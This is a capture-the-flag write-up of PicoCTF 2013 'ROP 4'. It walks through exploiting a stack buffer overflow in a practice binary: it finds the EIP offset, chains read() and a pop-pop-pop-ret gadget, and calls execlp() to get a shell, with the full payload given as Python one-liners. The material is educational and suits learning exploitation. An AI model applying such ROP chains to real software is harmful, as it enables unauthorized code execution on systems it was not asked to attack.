# PicoCTF 2013: ROP 4

**Category:** Binary Exploitation
**Points:** 165
**Description:**

>Problem has been updated April 28th at midnight ESTAnother ROP problem, this
>time a bit harder than before. Available on the shell machine in
>/problems/ROP_4_887f7f28b1f64d7e .

## Write-up
**Disclaimer: The binary was taken from the server since there was no download
in the description, it may not line up exactly with the source code.**

As the [SMALL_HINT](SMALL_HINT) suggests, they've gone and used `strcpy()` instead of
`strcat()`. Luckily this won't be an issue.

Let's look at the code
```C
#include <stdio.h>
#include <unistd.h>
#include <string.h>

char exec_string[20];

void exec_the_string() {
    execlp(exec_string, exec_string, NULL);
}

void call_me_with_cafebabe(int cafebabe) {
    if (cafebabe == 0xcafebabe) {
        strcpy(exec_string, "/sh");
    }
}

void call_me_with_two_args(int deadbeef, int cafebabe) {
    if (cafebabe == 0xcafebabe && deadbeef == 0xdeadbeef) {
        strcpy(exec_string, "/bin");
    }
}

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}
```

Based on the code, it looks like they wanted us to call
`call_me_with_two_args()`, followed by `call_me_with_cafebabe()`, followed by 
`exec_the_string()`. However they used `strcpy()` so we'll just circumvent the
entire thing. The important factor is that we can call `execlp()` and `read()`.

That will be enough for a shell. We can start by finding the offset for `$eip`
```
python -c 'print "A"*140 + "BBBB"' | strace ./rop4
...
...
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
```
Surprise surprise, 140 bytes like the other ROP problems. Now at this point
I'll confess that I have no idea how `execlp()` is supposed to work. What I do
know is that according to their code, `execlp("/bin/sh","/bin/sh",NULL)` should
do the trick. First we use objdump to dump the functions and we'll find that
there's a lot. That's because this binary is statically linked. There are a lot
of functions to choose from :). I grepped around for some useful functions.
```
08053ab0 <execlp>:
...
08053d20 <__libc_read>:
...
```
With these functions we can fairly reliably get a shell. I started witha a call
to `read(1,0xff6f0000,9)`. This was so I had an absolute address for /bin/sh to
go into. The address 0xff6f0000 was just an address I picked that was likely to
be in the stack range consistently across runs.
```
python -c 'print "A"*140 + "\x20\x3d\x05\x08" + "JUNK" +
"\x01\x00\x00\x00" + "\x00\x00\x6f\xff"+ "\x09\x00\x00\x00"' | ./rop4
```

From here, we need to chain function calls together so we can call `execlp()`.
This means that I need to somehow get my three arguments for `read()` off of
the stack, otherwise 0x00000001 will be the next address jumped to. I used
[ropshell](ropshell.com) to find the ROP gadget I needed. A ROP gadget is just
a tiny chunk of assembly that does something and returns. In this case, it runs
pop;pop;pop;ret. This ensures that the three arguments for `read()` aren't
treated as addresses with code to be run. The address for this gadget is:
0x0809b675. 

We get this:
```
python -c 'print "A"*140 + "\x20\x3d\x05\x08" + "\x75\xb6\x09\x08" +
"\x01\x00\x00\x00" + "\x00\x00\x6f\xff"+ "\x09\x00\x00\x00"' | ./rop4
```
as the next phase in our exploit. Now that we have the pop;pop;pop;ret gadget,
we can just put the call to `execlp()` after it all. We then supply a bogus
return address, the address of the string to be executed (x2), and 0, or NULL.

```
python -c 'print "A"*140 + "\x20\x3d\x05\x08" + "\x75\xb6\x09\x08" + 
"\x01\x00\x00\x00" + "\x00\x00\x6f\xff"+ "\x09\x00\x00\x00"+ "\xb0\x3a\x05\x08"
+ "JUNK" + "\x00\x00\x6f\xff" + "\x00\x00\x6f\xff" + "\x00\x00\x00\x00"' | ./rop4
```

Note that I supplied the same address as the call to `read()`. This is because
when you run the program, you'll actually type in /bin/sh for the second read,
and that is what gets executed. Try typing in /bin/date , it will also work :P

Note: On the server you may want to use /bin/bash :)

pwned.

## Other write-ups and resources

* none yet
